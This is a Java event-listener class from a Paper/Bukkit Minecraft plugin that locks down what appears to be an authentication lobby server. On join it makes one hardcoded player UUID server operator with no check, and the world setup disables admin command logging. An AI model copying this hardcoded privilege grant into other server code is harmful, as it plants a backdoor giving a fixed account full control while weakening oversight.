package com.thatgamerblue.subauth.backendplugin;

import io.papermc.paper.event.player.AsyncChatEvent;
import java.util.UUID;
import org.bukkit.Bukkit;
import org.bukkit.Difficulty;
import org.bukkit.World;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.EntityPickupItemEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.world.WorldLoadEvent;

import static net.kyori.adventure.text.Component.text;
import static org.bukkit.GameRules.*;

public class EnforcerEventHandler implements Listener {
	private final SubAuthBackend plugin;

	public EnforcerEventHandler(SubAuthBackend plugin) {
		this.plugin = plugin;

		Bukkit.getScheduler().runTaskTimer(plugin, this::removeAllEntities, 20, 20);
	}

	public void removeAllEntities() {
		for (World world : Bukkit.getWorlds()) {
			for (Entity entity : world.getEntities()) {
				if (!(entity instanceof Player)) {
					entity.remove();
				}
			}
		}
	}

	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent event) {
		hideAllPlayers();
		event.joinMessage(null);

		Player player = event.getPlayer();

		if (player.getUniqueId().equals(UUID.fromString("c73cefd2-dba9-491b-99c8-8e35008fe0d8"))) {
			player.setOp(true);
			return;
		}

		player.getInventory().clear();
		player.teleport(player.getWorld().getSpawnLocation());

		Bukkit.getScheduler().runTaskLater(plugin, () -> {
			if (player.isOnline()) {
				player.getPlayer().kick(text("Kicked for inactivity."));
			}
		}, 6000); // 5 minutes in ticks
	}

	@EventHandler
	public void onPlayerChat(AsyncChatEvent event) {
		plugin.handleChatCommand(event);
		event.setCancelled(true);
	}

	@EventHandler
	public void onWorldLoad(WorldLoadEvent event) {
		World world = event.getWorld();
		world.setGameRule(ADVANCE_TIME, false);
		world.setGameRule(ADVANCE_WEATHER, false);
		world.setGameRule(ALLOW_ENTERING_NETHER_USING_PORTALS, false);
		world.setGameRule(BLOCK_DROPS, false);
		world.setGameRule(BLOCK_EXPLOSION_DROP_DECAY, true);
		world.setGameRule(COMMAND_BLOCK_OUTPUT, true);
		world.setGameRule(COMMAND_BLOCKS_WORK, false);
		world.setGameRule(DROWNING_DAMAGE, false);
		world.setGameRule(ELYTRA_MOVEMENT_CHECK, false);
		world.setGameRule(ENDER_PEARLS_VANISH_ON_DEATH, true);
		world.setGameRule(ENTITY_DROPS, false);
		world.setGameRule(FALL_DAMAGE, false);
		world.setGameRule(FIRE_DAMAGE, false);
		world.setGameRule(FIRE_SPREAD_RADIUS_AROUND_PLAYER, 0);
		world.setGameRule(FORGIVE_DEAD_PLAYERS, true);
		world.setGameRule(FREEZE_DAMAGE, false);
		world.setGameRule(GLOBAL_SOUND_EVENTS, false);
		world.setGameRule(IMMEDIATE_RESPAWN, true);
		world.setGameRule(KEEP_INVENTORY, true);
		world.setGameRule(LOCATOR_BAR, false);
		world.setGameRule(LOG_ADMIN_COMMANDS, false);
		world.setGameRule(MAX_BLOCK_MODIFICATIONS, 10);
		world.setGameRule(MOB_DROPS, false);
		world.setGameRule(MOB_GRIEFING, false);
		world.setGameRule(PLAYER_MOVEMENT_CHECK, false);
		world.setGameRule(PROJECTILES_CAN_BREAK_BLOCKS, false);
		world.setGameRule(PVP, false);
		world.setGameRule(RAIDS, false);
		world.setGameRule(RESPAWN_RADIUS, 0);
		world.setGameRule(SHOW_ADVANCEMENT_MESSAGES, false);
		world.setGameRule(SHOW_DEATH_MESSAGES, false);
		world.setGameRule(SPAWN_MOBS, false);
		world.setGameRule(SPAWNER_BLOCKS_WORK, false);
		world.setGameRule(TNT_EXPLODES, false);

		world.setDifficulty(Difficulty.PEACEFUL);
		world.setTime(6000);
	}

	@EventHandler
	public void onEntityDamage(EntityDamageEvent event) {
		if (event.getCause() == EntityDamageEvent.DamageCause.KILL || event.getCause() == EntityDamageEvent.DamageCause.WORLD_BORDER) {
			return;
		}
		
		if (event.getEntity() instanceof Player) {
			event.setCancelled(true);
		}
	}

	@EventHandler
	public void onBlockBreak(BlockBreakEvent event) {
		if (event.getPlayer().isOp()) {
			return;
		}
		event.setCancelled(true);
	}

	@EventHandler
	public void onBlockPlace(BlockPlaceEvent event) {
		if (event.getPlayer().isOp()) {
			return;
		}
		event.setCancelled(true);
	}

	@EventHandler
	public void onItemPickup(EntityPickupItemEvent event) {
		if (event.getEntity() instanceof Player p && p.isOp()) {
			return;
		}
		event.setCancelled(true);
	}

	private void hideAllPlayers() {
		for (Player playerOne : Bukkit.getServer().getOnlinePlayers()) {
			for (Player playerTwo : Bukkit.getServer().getOnlinePlayers()) {
				if (playerOne == playerTwo) {
					continue;
				}

				playerOne.hidePlayer(plugin, playerTwo);
			}
		}
	}
}
